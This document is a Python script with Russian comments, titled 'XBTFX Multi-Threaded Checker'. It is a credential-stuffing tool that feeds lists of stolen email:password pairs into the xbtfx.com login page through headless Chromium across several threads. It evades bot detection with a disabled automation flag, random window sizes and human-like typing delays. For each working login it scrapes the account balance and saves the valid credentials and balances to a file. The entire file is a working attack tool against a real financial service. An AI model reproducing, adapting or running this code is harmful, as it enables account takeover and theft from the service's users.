from DrissionPage import ChromiumPage, ChromiumOptions
import time
import os
import re
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

# Инициализация цветов
init(autoreset=True)

# Константы цветов для удобства
G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE
M = Fore.MAGENTA

# Блокировка для записи в файлы (чтобы потоки не писали одновременно)
file_lock = threading.Lock()

def get_balance(page):
    time.sleep(random.uniform(3, 5)) 
    try:
        amount_el = page.ele('.portfolio-item-value-amount', timeout=5)
        currency_el = page.ele('.portfolio-item-value-currency', timeout=5)
        if amount_el and currency_el:
            return f"{amount_el.text.strip()} {currency_el.text.strip()}"
        match = re.search(r'>\s*([\d\.,]+)\s*([A-Z]{3,4})\s*<', page.html)
        if match:
            return f"{match.group(1)} {match.group(2)}"
        return "0 USD"
    except:
        return "0 USD"

def check_account(thread_id, email, password):
    prefix = f"{C}[Thread-{thread_id}]{W}"
    print(f"{prefix} Проверка: {Y}{email}")
    
    co = ChromiumOptions()
    co.set_argument('--headless=new')
    co.set_argument('--disable-gpu')
    co.set_argument('--no-sandbox')
    co.set_argument('--disable-blink-features=AutomationControlled')
    
    # Рандомизация отпечатка для каждого потока
    resolutions = ['1920,1080', '1366,768', '1440,900', '1536,864']
    co.set_argument(f'--window-size={random.choice(resolutions)}')
    
    # Уникальный профиль и порт для каждого потока
    profile_path = os.path.join(os.getcwd(), 'profiles', f'thread_{thread_id}')
    co.set_user_data_path(profile_path)
    co.auto_port()

    page = None
    try:
        page = ChromiumPage(co)
        # Рандомная задержка перед заходом (имитация очереди)
        time.sleep(random.uniform(1, 4))
        
        page.get('https://my.xbtfx.com/en/auth/sign-in')
        
        email_input = page.wait.ele_displayed('@placeholder=Email', timeout=20)
        if not email_input:
            if "verify" in page.html.lower():
                return "BLOCK (Captcha)"
            return "ERROR (Timeout)"

        # Имитация человеческого ввода
        email_input.input(email)
        time.sleep(random.uniform(0.3, 0.7))
        page.ele('@placeholder=Password').input(password)
        
        time.sleep(random.uniform(0.5, 1.2))
        btn = page.ele('tag:button@@text():Log In', timeout=5)
        if btn:
            btn.click()
        else:
            page.actions.key_down('\n').key_up('\n')

        for _ in range(20):
            time.sleep(1)
            if any(word in page.url for word in ['dashboard', 'accounts', 'overview']):
                balance = get_balance(page)
                return f"{G}GOOD{W} | Balance: {M}{balance}"
            if "Invalid email or password" in page.html or "Authentication failed" in page.html:
                return f"{R}BAD{W}"
        
        return f"{Y}UNKNOWN{W}"

    except Exception as e:
        return f"{R}ERROR ({str(e)[:20]}){W}"
    finally:
        if page:
            page.quit()

def worker(thread_id, account_data):
    email, password = account_data.split(":", 1)
    
    # Выполняем проверку
    status_text = check_account(thread_id, email, password)
    
    # Вывод результата
    clean_status = status_text.replace(G, "").replace(R, "").replace(Y, "").replace(W, "").replace(M, "")
    print(f"{C}[Thread-{thread_id}]{W} {email} -> {status_text}")
    
    # Сохранение результатов (с блокировкой файла)
    with file_lock:
        # 1. Записываем в общий лог проверенных (для автосейва)
        with open('checked_accounts.txt', 'a', encoding='utf-8') as f:
            f.write(f"{email}\n")
        
        # 2. Если ГУД - пишем в результат
        if "GOOD" in status_text:
            with open('xbtfx_good.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | {clean_status.split('|')[-1].strip()}\n")

def main():
    print(f"{M}=== XBTFX Multi-Threaded Checker v23 ==={W}")
    
    file_path = input(f"{Y}Перетяните .txt файл с аккаунтами: {W}").strip().replace('"', '').replace("'", "")
    if not os.path.exists(file_path):
        print(f"{R}[-] Файл не найден.{W}")
        return

    try:
        num_threads = int(input(f"{Y}Введите количество потоков (1-5): {W}"))
        if num_threads > 5: num_threads = 5
    except:
        num_threads = 2

    # Загружаем аккаунты
    with open(file_path, 'r', encoding='utf-8') as f:
        all_accounts = [line.strip() for line in f if ":" in line]

    # АВТОСЕЙВ: Загружаем уже проверенные аккаунты
    checked_emails = set()
    if os.path.exists('checked_accounts.txt'):
        with open('checked_accounts.txt', 'r', encoding='utf-8') as f:
            checked_emails = {line.strip() for line in f}

    # Фильтруем список (оставляем только те, что еще не проверяли)
    queue = [acc for acc in all_accounts if acc.split(":")[0] not in checked_emails]
    
    skipped = len(all_accounts) - len(queue)
    if skipped > 0:
        print(f"{G}[*] Пропущено (уже проверено ранее): {skipped}{W}")

    print(f"{G}[*] К проверке: {len(queue)} аккаунтов в {num_threads} потоках.{W}\n")

    # Запуск многопоточности
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for i in range(len(queue)):
            # thread_id будет от 1 до num_threads
            t_id = (i % num_threads) + 1
            executor.submit(worker, t_id, queue[i])

    print(f"\n{M}=== ПРОВЕРКА ЗАВЕРШЕНА ==={W}")

if __name__ == "__main__":
    main()
```

